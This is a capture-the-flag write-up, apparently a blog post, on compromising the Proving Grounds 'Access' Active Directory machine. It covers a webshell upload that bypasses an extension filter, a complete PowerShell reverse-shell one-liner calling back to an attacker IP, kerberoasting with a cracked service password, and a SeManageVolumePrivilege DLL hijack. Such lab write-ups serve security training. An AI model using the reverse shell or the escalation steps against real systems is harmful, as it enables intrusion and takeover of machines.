---
title: "Access"
date: 2025-06-20
categories:
  - Proving Grounds
  - Active Directory
tags:
  - Proving Grounds
  - Active Directory
---

# Access 🔸
<!-- more -->


## Enumeration

![](../assets/Pasted%20image%2020250323155804.png)

Web server shows a page about the event.

![](../assets/Pasted%20image%2020250323155931.png)

## Initial Access

We can upload images, so we can upload a webshell; change the extension by intercepting the request and change it from `.png` to `.php...`

![](../assets/Pasted%20image%2020250323170917.png)

File will be in `/uploads` (discovered with `feroxbuster`).

![](../assets/Pasted%20image%2020250323171044.png)

Now let's try to get a reverse shell:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.220',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

![](../assets/Pasted%20image%2020250323182244.png)

## Privilege Escalation

Transfer `sharphound` and get the zip. See the data in `bloodhound`.

User `svc_mssql` is kerberoastable.

We don't have `svc_apache` password, so we have to execute the attack on the target. Transfer `rubeus` there.

![](../assets/Pasted%20image%2020250323190341.png)

Using `hashcat`:

![](../assets/Pasted%20image%2020250323190445.png)

We have `svc_mssql:trustno1`

To execute commands as this user, we need `runas`.

Using `-Remote`, we can redirect the shell to a remote one.

![](../assets/Pasted%20image%2020250323223151.png)

This user has `SeManageVolumePrivilege`.

![](../assets/Pasted%20image%2020250323223409.png)

Using [https://github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

Download and transfer the exe.

![](../assets/Pasted%20image%2020250323230405.png)

Now, following the readme, generate a malicious DLL with `msfvenom` and transfer it to `C:\windows\system32\spool\drivers\x64\3\PrintConfig.dll`

Start a listener and trigger it.

![](../assets/Pasted%20image%2020250323233313.png)
![](../assets/Pasted%20image%2020250323233344.png)

## Post Exploitation

![](../assets/Pasted%20image%2020250323233402.png)
